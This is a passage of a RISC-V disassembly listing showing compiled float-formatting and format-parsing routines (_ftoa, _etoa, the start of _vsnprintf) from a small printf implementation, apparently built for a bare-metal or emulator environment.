    80004b54:	47fd                	li	a5,31
    80004b56:	06e7e763          	bltu	a5,a4,80004bc4 <_ftoa+0x50e>
    80004b5a:	fe744783          	lbu	a5,-25(s0)
    80004b5e:	0ff7f793          	zext.b	a5,a5
    80004b62:	cf91                	beqz	a5,80004b7e <_ftoa+0x4c8>
    80004b64:	fe843783          	ld	a5,-24(s0)
    80004b68:	00178713          	addi	a4,a5,1
    80004b6c:	fee43423          	sd	a4,-24(s0)
    80004b70:	17c1                	addi	a5,a5,-16
    80004b72:	97a2                	add	a5,a5,s0
    80004b74:	02d00713          	li	a4,45
    80004b78:	fae78823          	sb	a4,-80(a5)
    80004b7c:	a0a1                	j	80004bc4 <_ftoa+0x50e>
    80004b7e:	f6c42783          	lw	a5,-148(s0)
    80004b82:	8b91                	andi	a5,a5,4
    80004b84:	2781                	sext.w	a5,a5
    80004b86:	cf91                	beqz	a5,80004ba2 <_ftoa+0x4ec>
    80004b88:	fe843783          	ld	a5,-24(s0)
    80004b8c:	00178713          	addi	a4,a5,1
    80004b90:	fee43423          	sd	a4,-24(s0)
    80004b94:	17c1                	addi	a5,a5,-16
    80004b96:	97a2                	add	a5,a5,s0
    80004b98:	02b00713          	li	a4,43
    80004b9c:	fae78823          	sb	a4,-80(a5)
    80004ba0:	a015                	j	80004bc4 <_ftoa+0x50e>
    80004ba2:	f6c42783          	lw	a5,-148(s0)
    80004ba6:	8ba1                	andi	a5,a5,8
    80004ba8:	2781                	sext.w	a5,a5
    80004baa:	cf89                	beqz	a5,80004bc4 <_ftoa+0x50e>
    80004bac:	fe843783          	ld	a5,-24(s0)
    80004bb0:	00178713          	addi	a4,a5,1
    80004bb4:	fee43423          	sd	a4,-24(s0)
    80004bb8:	17c1                	addi	a5,a5,-16
    80004bba:	97a2                	add	a5,a5,s0
    80004bbc:	02000713          	li	a4,32
    80004bc0:	fae78823          	sb	a4,-80(a5)
    80004bc4:	f6c42683          	lw	a3,-148(s0)
    80004bc8:	f7042783          	lw	a5,-144(s0)
    80004bcc:	fa040713          	addi	a4,s0,-96
    80004bd0:	88b6                	mv	a7,a3
    80004bd2:	883e                	mv	a6,a5
    80004bd4:	fe843783          	ld	a5,-24(s0)
    80004bd8:	f8043683          	ld	a3,-128(s0)
    80004bdc:	f8843603          	ld	a2,-120(s0)
    80004be0:	f9043583          	ld	a1,-112(s0)
    80004be4:	f9843503          	ld	a0,-104(s0)
    80004be8:	cf6ff0ef          	jal	800040de <_out_rev>
    80004bec:	87aa                	mv	a5,a0
    80004bee:	853e                	mv	a0,a5
    80004bf0:	60ea                	ld	ra,152(sp)
    80004bf2:	644a                	ld	s0,144(sp)
    80004bf4:	610d                	addi	sp,sp,160
    80004bf6:	8082                	ret

Disassembly of section .text._etoa:

0000000080004bf8 <_etoa>:
    80004bf8:	7135                	addi	sp,sp,-160
    80004bfa:	ed06                	sd	ra,152(sp)
    80004bfc:	e922                	sd	s0,144(sp)
    80004bfe:	1100                	addi	s0,sp,160
    80004c00:	faa43423          	sd	a0,-88(s0)
    80004c04:	fab43023          	sd	a1,-96(s0)
    80004c08:	f8c43c23          	sd	a2,-104(s0)
    80004c0c:	f8d43823          	sd	a3,-112(s0)
    80004c10:	f8a43427          	fsd	fa0,-120(s0)
    80004c14:	863a                	mv	a2,a4
    80004c16:	86be                	mv	a3,a5
    80004c18:	8742                	mv	a4,a6
    80004c1a:	87b2                	mv	a5,a2
    80004c1c:	f8f42223          	sw	a5,-124(s0)
    80004c20:	87b6                	mv	a5,a3
    80004c22:	f8f42023          	sw	a5,-128(s0)
    80004c26:	87ba                	mv	a5,a4
    80004c28:	f6f42e23          	sw	a5,-132(s0)
    80004c2c:	f8843707          	fld	fa4,-120(s0)
    80004c30:	f8843787          	fld	fa5,-120(s0)
    80004c34:	a2f727d3          	feq.d	a5,fa4,fa5
    80004c38:	c78d                	beqz	a5,80004c62 <_etoa+0x6a>
    80004c3a:	f8843707          	fld	fa4,-120(s0)
    80004c3e:	00002797          	auipc	a5,0x2
    80004c42:	0ea78793          	addi	a5,a5,234 # 80006d28 <__am_mainargs+0x16b>
    80004c46:	239c                	fld	fa5,0(a5)
    80004c48:	a2e797d3          	flt.d	a5,fa5,fa4
    80004c4c:	eb99                	bnez	a5,80004c62 <_etoa+0x6a>
    80004c4e:	f8843707          	fld	fa4,-120(s0)
    80004c52:	00002797          	auipc	a5,0x2
    80004c56:	0ce78793          	addi	a5,a5,206 # 80006d20 <__am_mainargs+0x163>
    80004c5a:	239c                	fld	fa5,0(a5)
    80004c5c:	a2f717d3          	flt.d	a5,fa4,fa5
    80004c60:	c795                	beqz	a5,80004c8c <_etoa+0x94>
    80004c62:	f7c42683          	lw	a3,-132(s0)
    80004c66:	f8042783          	lw	a5,-128(s0)
    80004c6a:	f8442703          	lw	a4,-124(s0)
    80004c6e:	8836                	mv	a6,a3
    80004c70:	f8843507          	fld	fa0,-120(s0)
    80004c74:	f9043683          	ld	a3,-112(s0)
    80004c78:	f9843603          	ld	a2,-104(s0)
    80004c7c:	fa043583          	ld	a1,-96(s0)
    80004c80:	fa843503          	ld	a0,-88(s0)
    80004c84:	a33ff0ef          	jal	800046b6 <_ftoa>
    80004c88:	87aa                	mv	a5,a0
    80004c8a:	a135                	j	800050b6 <_etoa+0x4be>
    80004c8c:	f8843787          	fld	fa5,-120(s0)
    80004c90:	f2000753          	fmv.d.x	fa4,zero
    80004c94:	a2e797d3          	flt.d	a5,fa5,fa4
    80004c98:	00f037b3          	snez	a5,a5
    80004c9c:	fef401a3          	sb	a5,-29(s0)
    80004ca0:	fe344783          	lbu	a5,-29(s0)
    80004ca4:	0ff7f793          	zext.b	a5,a5
    80004ca8:	c799                	beqz	a5,80004cb6 <_etoa+0xbe>
    80004caa:	f8843787          	fld	fa5,-120(s0)
    80004cae:	22f797d3          	fneg.d	fa5,fa5
    80004cb2:	f8f43427          	fsd	fa5,-120(s0)
    80004cb6:	f7c42783          	lw	a5,-132(s0)
    80004cba:	4007f793          	andi	a5,a5,1024
    80004cbe:	2781                	sext.w	a5,a5
    80004cc0:	e781                	bnez	a5,80004cc8 <_etoa+0xd0>
    80004cc2:	4799                	li	a5,6
    80004cc4:	f8f42223          	sw	a5,-124(s0)
    80004cc8:	f8843787          	fld	fa5,-120(s0)
    80004ccc:	faf43c27          	fsd	fa5,-72(s0)
    80004cd0:	fb843783          	ld	a5,-72(s0)
    80004cd4:	93d1                	srli	a5,a5,0x34
    80004cd6:	2781                	sext.w	a5,a5
    80004cd8:	7ff7f793          	andi	a5,a5,2047
    80004cdc:	2781                	sext.w	a5,a5
    80004cde:	c017879b          	addiw	a5,a5,-1023
    80004ce2:	fcf42e23          	sw	a5,-36(s0)
    80004ce6:	fb843703          	ld	a4,-72(s0)
    80004cea:	2b401793          	bseti	a5,zero,0x34
    80004cee:	17fd                	addi	a5,a5,-1
    80004cf0:	8f7d                	and	a4,a4,a5
    80004cf2:	3ff00793          	li	a5,1023
    80004cf6:	17d2                	slli	a5,a5,0x34
    80004cf8:	8fd9                	or	a5,a5,a4
    80004cfa:	faf43c23          	sd	a5,-72(s0)
    80004cfe:	fdc42783          	lw	a5,-36(s0)
    80004d02:	d2078753          	fcvt.d.w	fa4,a5
    80004d06:	00002797          	auipc	a5,0x2
    80004d0a:	04278793          	addi	a5,a5,66 # 80006d48 <__am_mainargs+0x18b>
    80004d0e:	239c                	fld	fa5,0(a5)
    80004d10:	12f77753          	fmul.d	fa4,fa4,fa5
    80004d14:	00002797          	auipc	a5,0x2
    80004d18:	03c78793          	addi	a5,a5,60 # 80006d50 <__am_mainargs+0x193>
    80004d1c:	239c                	fld	fa5,0(a5)
    80004d1e:	02f77753          	fadd.d	fa4,fa4,fa5
    80004d22:	fb843687          	fld	fa3,-72(s0)
    80004d26:	00002797          	auipc	a5,0x2
    80004d2a:	03278793          	addi	a5,a5,50 # 80006d58 <__am_mainargs+0x19b>
    80004d2e:	239c                	fld	fa5,0(a5)
    80004d30:	0af6f6d3          	fsub.d	fa3,fa3,fa5
    80004d34:	00002797          	auipc	a5,0x2
    80004d38:	02c78793          	addi	a5,a5,44 # 80006d60 <__am_mainargs+0x1a3>
    80004d3c:	239c                	fld	fa5,0(a5)
    80004d3e:	12f6f7d3          	fmul.d	fa5,fa3,fa5
    80004d42:	02f777d3          	fadd.d	fa5,fa4,fa5
    80004d46:	c20797d3          	fcvt.w.d	a5,fa5,rtz
    80004d4a:	fef42623          	sw	a5,-20(s0)
    80004d4e:	fec42783          	lw	a5,-20(s0)
    80004d52:	d2078753          	fcvt.d.w	fa4,a5
    80004d56:	00002797          	auipc	a5,0x2
    80004d5a:	01278793          	addi	a5,a5,18 # 80006d68 <__am_mainargs+0x1ab>
    80004d5e:	239c                	fld	fa5,0(a5)
    80004d60:	12f77753          	fmul.d	fa4,fa4,fa5
    80004d64:	00002797          	auipc	a5,0x2
    80004d68:	fdc78793          	addi	a5,a5,-36 # 80006d40 <__am_mainargs+0x183>
    80004d6c:	239c                	fld	fa5,0(a5)
    80004d6e:	02f777d3          	fadd.d	fa5,fa4,fa5
    80004d72:	c20797d3          	fcvt.w.d	a5,fa5,rtz
    80004d76:	fcf42e23          	sw	a5,-36(s0)
    80004d7a:	fec42783          	lw	a5,-20(s0)
    80004d7e:	d2078753          	fcvt.d.w	fa4,a5
    80004d82:	00002797          	auipc	a5,0x2
    80004d86:	fee78793          	addi	a5,a5,-18 # 80006d70 <__am_mainargs+0x1b3>
    80004d8a:	239c                	fld	fa5,0(a5)
    80004d8c:	12f77753          	fmul.d	fa4,fa4,fa5
    80004d90:	fdc42783          	lw	a5,-36(s0)
    80004d94:	d20786d3          	fcvt.d.w	fa3,a5
    80004d98:	00002797          	auipc	a5,0x2
    80004d9c:	fe078793          	addi	a5,a5,-32 # 80006d78 <__am_mainargs+0x1bb>
    80004da0:	239c                	fld	fa5,0(a5)
    80004da2:	12f6f7d3          	fmul.d	fa5,fa3,fa5
    80004da6:	0af777d3          	fsub.d	fa5,fa4,fa5
    80004daa:	fcf43827          	fsd	fa5,-48(s0)
    80004dae:	fd043787          	fld	fa5,-48(s0)
    80004db2:	12f7f7d3          	fmul.d	fa5,fa5,fa5
    80004db6:	fcf43427          	fsd	fa5,-56(s0)
    80004dba:	fdc42783          	lw	a5,-36(s0)
    80004dbe:	3ff7879b          	addiw	a5,a5,1023
    80004dc2:	2781                	sext.w	a5,a5
    80004dc4:	17d2                	slli	a5,a5,0x34
    80004dc6:	faf43c23          	sd	a5,-72(s0)
    80004dca:	fb843707          	fld	fa4,-72(s0)
    80004dce:	fd043787          	fld	fa5,-48(s0)
    80004dd2:	02f7f6d3          	fadd.d	fa3,fa5,fa5
    80004dd6:	00002797          	auipc	a5,0x2
    80004dda:	faa78793          	addi	a5,a5,-86 # 80006d80 <__am_mainargs+0x1c3>
    80004dde:	2390                	fld	fa2,0(a5)
    80004de0:	fd043787          	fld	fa5,-48(s0)
    80004de4:	0af67653          	fsub.d	fa2,fa2,fa5
    80004de8:	fc843587          	fld	fa1,-56(s0)
    80004dec:	00002797          	auipc	a5,0x2
    80004df0:	f9c78793          	addi	a5,a5,-100 # 80006d88 <__am_mainargs+0x1cb>
    80004df4:	239c                	fld	fa5,0(a5)
    80004df6:	1af5f5d3          	fdiv.d	fa1,fa1,fa5
    80004dfa:	00002797          	auipc	a5,0x2
    80004dfe:	f9678793          	addi	a5,a5,-106 # 80006d90 <__am_mainargs+0x1d3>
    80004e02:	239c                	fld	fa5,0(a5)
    80004e04:	02f5f7d3          	fadd.d	fa5,fa1,fa5
    80004e08:	fc843587          	fld	fa1,-56(s0)
    80004e0c:	1af5f5d3          	fdiv.d	fa1,fa1,fa5
    80004e10:	00002797          	auipc	a5,0x2
    80004e14:	f8878793          	addi	a5,a5,-120 # 80006d98 <__am_mainargs+0x1db>
    80004e18:	239c                	fld	fa5,0(a5)
    80004e1a:	02f5f7d3          	fadd.d	fa5,fa1,fa5
    80004e1e:	fc843587          	fld	fa1,-56(s0)
    80004e22:	1af5f7d3          	fdiv.d	fa5,fa1,fa5
    80004e26:	02f677d3          	fadd.d	fa5,fa2,fa5
    80004e2a:	1af6f6d3          	fdiv.d	fa3,fa3,fa5
    80004e2e:	00002797          	auipc	a5,0x2
    80004e32:	f7278793          	addi	a5,a5,-142 # 80006da0 <__am_mainargs+0x1e3>
    80004e36:	239c                	fld	fa5,0(a5)
    80004e38:	02f6f7d3          	fadd.d	fa5,fa3,fa5
    80004e3c:	12f777d3          	fmul.d	fa5,fa4,fa5
    80004e40:	faf43c27          	fsd	fa5,-72(s0)
    80004e44:	fb843787          	fld	fa5,-72(s0)
    80004e48:	f8843707          	fld	fa4,-120(s0)
    80004e4c:	a2f717d3          	flt.d	a5,fa4,fa5
    80004e50:	c38d                	beqz	a5,80004e72 <_etoa+0x27a>
    80004e52:	fec42783          	lw	a5,-20(s0)
    80004e56:	37fd                	addiw	a5,a5,-1
    80004e58:	fef42623          	sw	a5,-20(s0)
    80004e5c:	fb843707          	fld	fa4,-72(s0)
    80004e60:	00002797          	auipc	a5,0x2
    80004e64:	f3078793          	addi	a5,a5,-208 # 80006d90 <__am_mainargs+0x1d3>
    80004e68:	239c                	fld	fa5,0(a5)
    80004e6a:	1af777d3          	fdiv.d	fa5,fa4,fa5
    80004e6e:	faf43c27          	fsd	fa5,-72(s0)
    80004e72:	fec42783          	lw	a5,-20(s0)
    80004e76:	0007871b          	sext.w	a4,a5
    80004e7a:	06300793          	li	a5,99
    80004e7e:	00e7cc63          	blt	a5,a4,80004e96 <_etoa+0x29e>
    80004e82:	fec42783          	lw	a5,-20(s0)
    80004e86:	0007871b          	sext.w	a4,a5
    80004e8a:	f9d00793          	li	a5,-99
    80004e8e:	00f74463          	blt	a4,a5,80004e96 <_etoa+0x29e>
    80004e92:	4791                	li	a5,4
    80004e94:	a011                	j	80004e98 <_etoa+0x2a0>
    80004e96:	4795                	li	a5,5
    80004e98:	fef42423          	sw	a5,-24(s0)
    80004e9c:	f7c42783          	lw	a5,-132(s0)
    80004ea0:	873e                	mv	a4,a5
    80004ea2:	28b01793          	bseti	a5,zero,0xb
    80004ea6:	8ff9                	and	a5,a5,a4
    80004ea8:	2781                	sext.w	a5,a5
    80004eaa:	c3d9                	beqz	a5,80004f30 <_etoa+0x338>
    80004eac:	f8843707          	fld	fa4,-120(s0)
    80004eb0:	00002797          	auipc	a5,0x2
    80004eb4:	ef878793          	addi	a5,a5,-264 # 80006da8 <__am_mainargs+0x1eb>
    80004eb8:	239c                	fld	fa5,0(a5)
    80004eba:	a2e787d3          	fle.d	a5,fa5,fa4
    80004ebe:	cbb1                	beqz	a5,80004f12 <_etoa+0x31a>
    80004ec0:	f8843707          	fld	fa4,-120(s0)
    80004ec4:	00002797          	auipc	a5,0x2
    80004ec8:	eec78793          	addi	a5,a5,-276 # 80006db0 <__am_mainargs+0x1f3>
    80004ecc:	239c                	fld	fa5,0(a5)
    80004ece:	a2f717d3          	flt.d	a5,fa4,fa5
    80004ed2:	c3a1                	beqz	a5,80004f12 <_etoa+0x31a>
    80004ed4:	f8442703          	lw	a4,-124(s0)
    80004ed8:	fec42783          	lw	a5,-20(s0)
    80004edc:	2781                	sext.w	a5,a5
    80004ede:	00e7dd63          	bge	a5,a4,80004ef8 <_etoa+0x300>
    80004ee2:	f8442783          	lw	a5,-124(s0)
    80004ee6:	fec42703          	lw	a4,-20(s0)
    80004eea:	9f99                	subw	a5,a5,a4
    80004eec:	2781                	sext.w	a5,a5
    80004eee:	37fd                	addiw	a5,a5,-1
    80004ef0:	2781                	sext.w	a5,a5
    80004ef2:	f8f42223          	sw	a5,-124(s0)
    80004ef6:	a019                	j	80004efc <_etoa+0x304>
    80004ef8:	f8042223          	sw	zero,-124(s0)
    80004efc:	f7c42783          	lw	a5,-132(s0)
    80004f00:	4007e793          	ori	a5,a5,1024
    80004f04:	f6f42e23          	sw	a5,-132(s0)
    80004f08:	fe042423          	sw	zero,-24(s0)
    80004f0c:	fe042623          	sw	zero,-20(s0)
    80004f10:	a005                	j	80004f30 <_etoa+0x338>
    80004f12:	f8442783          	lw	a5,-124(s0)
    80004f16:	2781                	sext.w	a5,a5
    80004f18:	cf81                	beqz	a5,80004f30 <_etoa+0x338>
    80004f1a:	f7c42783          	lw	a5,-132(s0)
    80004f1e:	4007f793          	andi	a5,a5,1024
    80004f22:	2781                	sext.w	a5,a5
    80004f24:	c791                	beqz	a5,80004f30 <_etoa+0x338>
    80004f26:	f8442783          	lw	a5,-124(s0)
    80004f2a:	37fd                	addiw	a5,a5,-1
    80004f2c:	f8f42223          	sw	a5,-124(s0)
    80004f30:	f8042783          	lw	a5,-128(s0)
    80004f34:	fef42223          	sw	a5,-28(s0)
    80004f38:	f8042783          	lw	a5,-128(s0)
    80004f3c:	873e                	mv	a4,a5
    80004f3e:	fe842783          	lw	a5,-24(s0)
    80004f42:	2701                	sext.w	a4,a4
    80004f44:	2781                	sext.w	a5,a5
    80004f46:	00e7fc63          	bgeu	a5,a4,80004f5e <_etoa+0x366>
    80004f4a:	fe442783          	lw	a5,-28(s0)
    80004f4e:	873e                	mv	a4,a5
    80004f50:	fe842783          	lw	a5,-24(s0)
    80004f54:	40f707bb          	subw	a5,a4,a5
    80004f58:	fef42223          	sw	a5,-28(s0)
    80004f5c:	a019                	j	80004f62 <_etoa+0x36a>
    80004f5e:	fe042223          	sw	zero,-28(s0)
    80004f62:	f7c42783          	lw	a5,-132(s0)
    80004f66:	8b89                	andi	a5,a5,2
    80004f68:	2781                	sext.w	a5,a5
    80004f6a:	c799                	beqz	a5,80004f78 <_etoa+0x380>
    80004f6c:	fe842783          	lw	a5,-24(s0)
    80004f70:	2781                	sext.w	a5,a5
    80004f72:	c399                	beqz	a5,80004f78 <_etoa+0x380>
    80004f74:	fe042223          	sw	zero,-28(s0)
    80004f78:	fec42783          	lw	a5,-20(s0)
    80004f7c:	2781                	sext.w	a5,a5
    80004f7e:	cb89                	beqz	a5,80004f90 <_etoa+0x398>
    80004f80:	fb843787          	fld	fa5,-72(s0)
    80004f84:	f8843707          	fld	fa4,-120(s0)
    80004f88:	1af777d3          	fdiv.d	fa5,fa4,fa5
    80004f8c:	f8f43427          	fsd	fa5,-120(s0)
    80004f90:	f9843783          	ld	a5,-104(s0)
    80004f94:	fcf43023          	sd	a5,-64(s0)
    80004f98:	fe344783          	lbu	a5,-29(s0)
    80004f9c:	0ff7f793          	zext.b	a5,a5
    80004fa0:	c791                	beqz	a5,80004fac <_etoa+0x3b4>
    80004fa2:	f8843787          	fld	fa5,-120(s0)
    80004fa6:	22f797d3          	fneg.d	fa5,fa5
    80004faa:	a019                	j	80004fb0 <_etoa+0x3b8>
    80004fac:	f8843787          	fld	fa5,-120(s0)
    80004fb0:	f7c42783          	lw	a5,-132(s0)
    80004fb4:	873e                	mv	a4,a5
    80004fb6:	77fd                	lui	a5,0xfffff
    80004fb8:	7ff78793          	addi	a5,a5,2047 # fffffffffffff7ff <_pmem_end+0xffffffff3ffff7ff>
    80004fbc:	8ff9                	and	a5,a5,a4
    80004fbe:	0007869b          	sext.w	a3,a5
    80004fc2:	fe442783          	lw	a5,-28(s0)
    80004fc6:	f8442703          	lw	a4,-124(s0)
    80004fca:	8836                	mv	a6,a3
    80004fcc:	22f78553          	fmv.d	fa0,fa5
    80004fd0:	f9043683          	ld	a3,-112(s0)
    80004fd4:	f9843603          	ld	a2,-104(s0)
    80004fd8:	fa043583          	ld	a1,-96(s0)
    80004fdc:	fa843503          	ld	a0,-88(s0)
    80004fe0:	ed6ff0ef          	jal	800046b6 <_ftoa>
    80004fe4:	f8a43c23          	sd	a0,-104(s0)
    80004fe8:	fe842783          	lw	a5,-24(s0)
    80004fec:	2781                	sext.w	a5,a5
    80004fee:	c3f1                	beqz	a5,800050b2 <_etoa+0x4ba>
    80004ff0:	f7c42783          	lw	a5,-132(s0)
    80004ff4:	0207f793          	andi	a5,a5,32
    80004ff8:	2781                	sext.w	a5,a5
    80004ffa:	c781                	beqz	a5,80005002 <_etoa+0x40a>
    80004ffc:	04500793          	li	a5,69
    80005000:	a019                	j	80005006 <_etoa+0x40e>
    80005002:	06500793          	li	a5,101
    80005006:	f9843703          	ld	a4,-104(s0)
    8000500a:	00170693          	addi	a3,a4,1
    8000500e:	f8d43c23          	sd	a3,-104(s0)
    80005012:	fa843803          	ld	a6,-88(s0)
    80005016:	f9043683          	ld	a3,-112(s0)
    8000501a:	863a                	mv	a2,a4
    8000501c:	fa043583          	ld	a1,-96(s0)
    80005020:	853e                	mv	a0,a5
    80005022:	9802                	jalr	a6
    80005024:	fec42783          	lw	a5,-20(s0)
    80005028:	41f7d79b          	sraiw	a5,a5,0x1f
    8000502c:	fec42703          	lw	a4,-20(s0)
    80005030:	8f3d                	xor	a4,a4,a5
    80005032:	40f707bb          	subw	a5,a4,a5
    80005036:	2781                	sext.w	a5,a5
    80005038:	863e                	mv	a2,a5
    8000503a:	fec42783          	lw	a5,-20(s0)
    8000503e:	01f7d79b          	srliw	a5,a5,0x1f
    80005042:	0ff7f693          	zext.b	a3,a5
    80005046:	fe842783          	lw	a5,-24(s0)
    8000504a:	37fd                	addiw	a5,a5,-1
    8000504c:	2781                	sext.w	a5,a5
    8000504e:	4715                	li	a4,5
    80005050:	e43a                	sd	a4,8(sp)
    80005052:	e03e                	sd	a5,0(sp)
    80005054:	4881                	li	a7,0
    80005056:	4829                	li	a6,10
    80005058:	87b6                	mv	a5,a3
    8000505a:	8732                	mv	a4,a2
    8000505c:	f9043683          	ld	a3,-112(s0)
    80005060:	f9843603          	ld	a2,-104(s0)
    80005064:	fa043583          	ld	a1,-96(s0)
    80005068:	fa843503          	ld	a0,-88(s0)
    8000506c:	c1eff0ef          	jal	8000448a <_ntoa_long>
    80005070:	f8a43c23          	sd	a0,-104(s0)
    80005074:	f7c42783          	lw	a5,-132(s0)
    80005078:	8b89                	andi	a5,a5,2
    8000507a:	2781                	sext.w	a5,a5
    8000507c:	cb9d                	beqz	a5,800050b2 <_etoa+0x4ba>
    8000507e:	a00d                	j	800050a0 <_etoa+0x4a8>
    80005080:	f9843783          	ld	a5,-104(s0)
    80005084:	00178713          	addi	a4,a5,1
    80005088:	f8e43c23          	sd	a4,-104(s0)
    8000508c:	fa843703          	ld	a4,-88(s0)
    80005090:	f9043683          	ld	a3,-112(s0)
    80005094:	863e                	mv	a2,a5
    80005096:	fa043583          	ld	a1,-96(s0)
    8000509a:	02000513          	li	a0,32
    8000509e:	9702                	jalr	a4
    800050a0:	f9843703          	ld	a4,-104(s0)
    800050a4:	fc043783          	ld	a5,-64(s0)
    800050a8:	8f1d                	sub	a4,a4,a5
    800050aa:	f8046783          	lwu	a5,-128(s0)
    800050ae:	fcf769e3          	bltu	a4,a5,80005080 <_etoa+0x488>
    800050b2:	f9843783          	ld	a5,-104(s0)
    800050b6:	853e                	mv	a0,a5
    800050b8:	60ea                	ld	ra,152(sp)
    800050ba:	644a                	ld	s0,144(sp)
    800050bc:	610d                	addi	sp,sp,160
    800050be:	8082                	ret

Disassembly of section .text._vsnprintf:

00000000800050c0 <_vsnprintf>:
    800050c0:	7135                	addi	sp,sp,-160
    800050c2:	ed06                	sd	ra,152(sp)
    800050c4:	e922                	sd	s0,144(sp)
    800050c6:	1100                	addi	s0,sp,160
    800050c8:	f8a43c23          	sd	a0,-104(s0)
    800050cc:	f8b43823          	sd	a1,-112(s0)
    800050d0:	f8c43423          	sd	a2,-120(s0)
    800050d4:	f8d43023          	sd	a3,-128(s0)
    800050d8:	f6e43c23          	sd	a4,-136(s0)
    800050dc:	fc043c23          	sd	zero,-40(s0)
    800050e0:	f9043783          	ld	a5,-112(s0)
    800050e4:	3c079ee3          	bnez	a5,80005cc0 <_vsnprintf+0xc00>
    800050e8:	fffff797          	auipc	a5,0xfffff
    800050ec:	ea278793          	addi	a5,a5,-350 # 80003f8a <_out_null>
    800050f0:	f8f43c23          	sd	a5,-104(s0)
    800050f4:	3cd0006f          	j	80005cc0 <_vsnprintf+0xc00>
    800050f8:	f8043783          	ld	a5,-128(s0)
    800050fc:	0007c783          	lbu	a5,0(a5)
    80005100:	873e                	mv	a4,a5
    80005102:	02500793          	li	a5,37
    80005106:	02f70b63          	beq	a4,a5,8000513c <_vsnprintf+0x7c>
    8000510a:	f8043783          	ld	a5,-128(s0)
    8000510e:	0007c503          	lbu	a0,0(a5)
    80005112:	fd843783          	ld	a5,-40(s0)
    80005116:	00178713          	addi	a4,a5,1
    8000511a:	fce43c23          	sd	a4,-40(s0)
    8000511e:	f9843703          	ld	a4,-104(s0)
    80005122:	f8843683          	ld	a3,-120(s0)
    80005126:	863e                	mv	a2,a5
    80005128:	f9043583          	ld	a1,-112(s0)
    8000512c:	9702                	jalr	a4
    8000512e:	f8043783          	ld	a5,-128(s0)
    80005132:	0785                	addi	a5,a5,1
    80005134:	f8f43023          	sd	a5,-128(s0)
    80005138:	3890006f          	j	80005cc0 <_vsnprintf+0xc00>
    8000513c:	f8043783          	ld	a5,-128(s0)
    80005140:	0785                	addi	a5,a5,1
    80005142:	f8f43023          	sd	a5,-128(s0)
    80005146:	fe042623          	sw	zero,-20(s0)
    8000514a:	f8043783          	ld	a5,-128(s0)
    8000514e:	0007c783          	lbu	a5,0(a5)
    80005152:	2781                	sext.w	a5,a5
    80005154:	fe07869b          	addiw	a3,a5,-32
    80005158:	0006871b          	sext.w	a4,a3
    8000515c:	47c1                	li	a5,16
    8000515e:	0ae7ef63          	bltu	a5,a4,8000521c <_vsnprintf+0x15c>
    80005162:	080687bb          	zext.w	a5,a3
    80005166:	00279713          	slli	a4,a5,0x2
    8000516a:	00002797          	auipc	a5,0x2
    8000516e:	c4e78793          	addi	a5,a5,-946 # 80006db8 <__am_mainargs+0x1fb>
    80005172:	97ba                	add	a5,a5,a4
    80005174:	439c                	lw	a5,0(a5)
    80005176:	0007871b          	sext.w	a4,a5
    8000517a:	00002797          	auipc	a5,0x2
    8000517e:	c3e78793          	addi	a5,a5,-962 # 80006db8 <__am_mainargs+0x1fb>
    80005182:	97ba                	add	a5,a5,a4
    80005184:	8782                	jr	a5
    80005186:	fec42783          	lw	a5,-20(s0)
    8000518a:	0017e793          	ori	a5,a5,1
    8000518e:	fef42623          	sw	a5,-20(s0)
    80005192:	f8043783          	ld	a5,-128(s0)
    80005196:	0785                	addi	a5,a5,1
    80005198:	f8f43023          	sd	a5,-128(s0)
    8000519c:	4785                	li	a5,1
    8000519e:	fef42023          	sw	a5,-32(s0)
    800051a2:	a041                	j	80005222 <_vsnprintf+0x162>
    800051a4:	fec42783          	lw	a5,-20(s0)
    800051a8:	0027e793          	ori	a5,a5,2
    800051ac:	fef42623          	sw	a5,-20(s0)
    800051b0:	f8043783          	ld	a5,-128(s0)
    800051b4:	0785                	addi	a5,a5,1
    800051b6:	f8f43023          	sd	a5,-128(s0)
    800051ba:	4785                	li	a5,1
    800051bc:	fef42023          	sw	a5,-32(s0)
    800051c0:	a08d                	j	80005222 <_vsnprintf+0x162>
    800051c2:	fec42783          	lw	a5,-20(s0)
    800051c6:	0047e793          	ori	a5,a5,4
    800051ca:	fef42623          	sw	a5,-20(s0)
    800051ce:	f8043783          	ld	a5,-128(s0)
    800051d2:	0785                	addi	a5,a5,1
    800051d4:	f8f43023          	sd	a5,-128(s0)
    800051d8:	4785                	li	a5,1
    800051da:	fef42023          	sw	a5,-32(s0)
    800051de:	a091                	j	80005222 <_vsnprintf+0x162>
    800051e0:	fec42783          	lw	a5,-20(s0)
    800051e4:	0087e793          	ori	a5,a5,8
    800051e8:	fef42623          	sw	a5,-20(s0)
    800051ec:	f8043783          	ld	a5,-128(s0)
    800051f0:	0785                	addi	a5,a5,1
    800051f2:	f8f43023          	sd	a5,-128(s0)
    800051f6:	4785                	li	a5,1
    800051f8:	fef42023          	sw	a5,-32(s0)
    800051fc:	a01d                	j	80005222 <_vsnprintf+0x162>
    800051fe:	fec42783          	lw	a5,-20(s0)
    80005202:	0107e793          	ori	a5,a5,16
    80005206:	fef42623          	sw	a5,-20(s0)
    8000520a:	f8043783          	ld	a5,-128(s0)
    8000520e:	0785                	addi	a5,a5,1
    80005210:	f8f43023          	sd	a5,-128(s0)
    80005214:	4785                	li	a5,1
    80005216:	fef42023          	sw	a5,-32(s0)
    8000521a:	a021                	j	80005222 <_vsnprintf+0x162>
    8000521c:	fe042023          	sw	zero,-32(s0)
    80005220:	0001                	nop
    80005222:	fe042783          	lw	a5,-32(s0)
    80005226:	2781                	sext.w	a5,a5
    80005228:	f38d                	bnez	a5,8000514a <_vsnprintf+0x8a>
    8000522a:	fe042423          	sw	zero,-24(s0)
    8000522e:	f8043783          	ld	a5,-128(s0)
    80005232:	0007c783          	lbu	a5,0(a5)
    80005236:	853e                	mv	a0,a5
    80005238:	dfbfe0ef          	jal	80004032 <_is_digit>
    8000523c:	87aa                	mv	a5,a0
    8000523e:	cb91                	beqz	a5,80005252 <_vsnprintf+0x192>
    80005240:	f8040793          	addi	a5,s0,-128
    80005244:	853e                	mv	a0,a5
    80005246:	e2dfe0ef          	jal	80004072 <_atoi>
    8000524a:	87aa                	mv	a5,a0
    8000524c:	fef42423          	sw	a5,-24(s0)
    80005250:	a8b9                	j	800052ae <_vsnprintf+0x1ee>
    80005252:	f8043783          	ld	a5,-128(s0)
    80005256:	0007c783          	lbu	a5,0(a5)
    8000525a:	873e                	mv	a4,a5
    8000525c:	02a00793          	li	a5,42
    80005260:	04f71763          	bne	a4,a5,800052ae <_vsnprintf+0x1ee>
    80005264:	f7843783          	ld	a5,-136(s0)
    80005268:	00878713          	addi	a4,a5,8
    8000526c:	f6e43c23          	sd	a4,-136(s0)
    80005270:	439c                	lw	a5,0(a5)
